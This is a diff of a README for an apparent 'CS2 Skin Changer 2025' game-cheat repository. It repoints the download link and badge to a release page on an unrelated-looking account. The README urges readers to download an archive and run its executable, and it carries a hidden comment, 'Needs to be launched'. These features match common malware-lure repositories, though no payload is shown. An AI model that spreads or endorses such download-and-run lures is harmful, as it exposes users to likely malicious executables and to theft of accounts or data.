@@ -22,7 +22,7 @@ Welcome to the ultimate CS2 Skin Changer 2025 repository! 🎮 Customize your CS
 
 ## Installation
 To install the CS2 Skin Changer 2025 tool, please follow these steps:
-1. Download the tool from the following link: [Download Here](https://github.com/file/App.zip) <!-- Needs to be launched -->
+1. Download the tool from the following link: [Download Here](https://github.com/Shivank-Pharma/CS2-Skin-Changer-2025/releases/tag/v2.0) <!-- Needs to be launched -->
 2. Extract the downloaded file to a location of your choice on your computer.
 3. Run the executable file and follow the on-screen instructions to complete the installation process.
 4. Once installed, launch the tool and start customizing your CS2 skins, knives, and gloves!
@@ -53,6 +53,6 @@ We welcome contributions from the CS2 community to help us improve and expand th
 ## License
 The CS2 Skin Changer 2025 tool is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-[![](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/file/App.zip)
+[![](https://github.com/Shivank-Pharma/CS2-Skin-Changer-2025/releases/tag/v2.0)](https://github.com/Shivank-Pharma/CS2-Skin-Changer-2025/releases/tag/v2.0)
 
 Thank you for choosing the CS2 Skin Changer 2025 tool to enhance your CS2 gaming experience. Customize, play, and conquer with style! 🎮🔥
